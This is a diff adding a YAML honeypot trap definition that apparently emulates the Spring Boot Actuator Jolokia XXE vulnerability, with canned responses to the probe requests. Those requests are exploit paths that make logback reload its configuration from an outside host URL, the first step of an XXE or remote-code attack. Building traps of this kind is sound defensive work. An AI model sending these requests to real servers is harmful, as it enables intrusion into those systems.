@@ -1,0 +1,35 @@
+id: springboot-actuators-jolokia-xxe
+info:
+  name: Spring Boot Actuators (Jolokia) XXE
+  author: dwisiswant0,ipanda
+  description: A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows
+    remote attackers to perform an XML External Entities (XXE) attack and include
+    content stored on a remote server as if it was its own. This has the potential
+    to allow the execution of arbitrary code and/or disclosure of sensitive information
+    from the target machine.
+  severity: high
+  reference:
+  - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+  - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+  metadata:
+    max-request: 2
+  tags: springboot,jolokia,xxe
+traps:
+- request:
+    method: GET
+    path: /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: http:\/\/nonexistent:31337\/logback.xmlreloadByURLJoranException
+- request:
+    method: GET
+    path: /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
